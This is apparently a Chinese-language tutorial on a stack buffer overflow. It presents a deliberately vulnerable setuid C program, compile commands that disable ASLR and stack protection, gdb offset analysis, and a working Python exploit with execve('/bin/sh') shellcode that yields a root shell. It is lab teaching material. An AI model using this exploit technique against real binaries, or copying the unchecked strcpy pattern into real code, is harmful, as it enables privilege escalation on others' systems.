##  Stack based buffer overflow

​	缓冲区溢出是源数据复制到目标缓冲区导致的数据溢出，其中源字符串长度大于目标缓冲区长度，且未做数据大小检查。该漏洞的核心原理是：**用户输入的数据溢出目标缓冲区并覆盖堆栈中的返回地址，攻击者在返回地址上写入要执行的Shellcode的地址。**

​	漏洞代码: 

```c
//vuln.c
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
}
```

​	编译代码(禁用ASLR；关闭栈保护；标记堆栈为可执行；ELF文件执行时获得root权限)：

```shell
#echo 0 > /proc/sys/kernel/randomize_va_space 
$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

​	反汇编代码：

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048414 <+0>:	    push   %ebp
   0x08048415 <+1>:	    mov    %esp,%ebp
   0x08048417 <+3>:	    and    $0xfffffff0,%esp
   0x0804841a <+6>:	    sub    $0x110,%esp
   0x08048420 <+12>:	mov    0xc(%ebp),%eax
   0x08048423 <+15>:	add    $0x4,%eax
   0x08048426 <+18>:	mov    (%eax),%eax
   0x08048428 <+20>:	mov    %eax,0x4(%esp)
   0x0804842c <+24>:	lea    0x10(%esp),%eax
   0x08048430 <+28>:	mov    %eax,(%esp)
   0x08048433 <+31>:	call   0x8048330 <strcpy@plt>
   0x08048438 <+36>:	mov    $0x8048530,%eax
   0x0804843d <+41>:	lea    0x10(%esp),%edx
   0x08048441 <+45>:	mov    %edx,0x4(%esp)
   0x08048445 <+49>:	mov    %eax,(%esp)
   0x08048448 <+52>:	call   0x8048320 <printf@plt>
   0x0804844d <+57>:	mov    $0x0,%eax
   0x08048452 <+62>:	leave  
   0x08048453 <+63>:	ret   
End of assembler dump.
```

​	缓冲区（buf）到main函数的返回地址的偏移量：**0x10c = 0x100 + 0x8 + 0x4**，0x100是buf的大小，0x8是对齐空间，0x4是调用函数的EBP。然后，输入 `A*268 + B*4`形式的数据, 用`BBBB`覆盖返回地址，得到返回地址在堆栈中的位置：

```
user@ubuntu:~/projects$ gdb -q vuln
Reading symbols from /home/user/projects/vuln...done.
((gdb) r `python -c 'print "A"*268 + "B"*4'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/test/vuln `python -c 'print "A"*268 + "B"*4'`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info frame
Stack level 0, frame at 0xbffff274:
 eip = 0x42424242; saved eip 0x0
 called by frame at 0xbffff278
 Arglist at 0xbffff26c, args: 
 Locals at 0xbffff26c, Previous frame's sp is 0xbffff274
 Saved registers:
  eip at 0xbffff270
(gdb) x/8x 0xbffff260
0xbffff260:	0x41414141	0x41414141	0x41414141	0x42424242 -------------------->ret_addr = 0xbffff26c
0xbffff270:	0x00000000	0xbffff304	0xbffff310	0xb7fdc858
```

​	因此，编写利用代码：

```python
# exp.py
# !/usr/bin/env python
import struct
from subprocess import call

# Stack address where shellcode is copied.
ret_addr = 0xbffff26c

# Spawn a shell
# execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# endianess convertion
def conv(num):
    return struct.pack("<I", num)

# buf = Junk + RA + NOP's + Shellcode
buf = "A" * 268
buf += conv(ret_addr)
buf += "\x90" * 100
buf += scode

print "Calling vulnerable program"
call(["./vuln", buf])
```

​	执行exploit得到了root shell，如下所示：

```
user@ubuntu:~/projects$ python exp.py
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh�������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���
# whoami
root
```

